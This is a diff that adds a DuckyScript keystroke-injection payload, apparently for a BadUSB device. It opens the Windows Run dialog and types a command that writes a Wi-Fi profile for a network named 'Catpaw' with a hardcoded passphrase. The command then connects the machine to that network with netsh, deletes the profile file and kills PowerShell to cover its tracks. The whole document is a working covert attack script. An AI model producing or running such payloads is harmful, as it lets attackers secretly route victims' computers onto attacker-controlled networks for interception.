@@ -1,0 +1,8 @@
+GUI R
+DELAY 150
+ENTER
+DELAY 150
+STRING mkdir c:\temp; set-content -path 'c:\temp\test.xml' -value ('<?xml version="1.0"?><WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"><name>Catpaw</name><SSIDConfig><SSID><hex>436174706177</hex><name>Catpaw</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>manual</connectionMode><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>qazwsx11!!</keyMaterial></sharedKey></security></MSM></WLANProfile>');netsh wlan add profile filename="c:\temp\test.xml";netsh wlan connect name=Catpaw ssid=Catpaw;rm 'c:\temp\test.xml';taskkill /f /im powershell.exe 
+DELAY 150
+ENTER
+DELAY 150
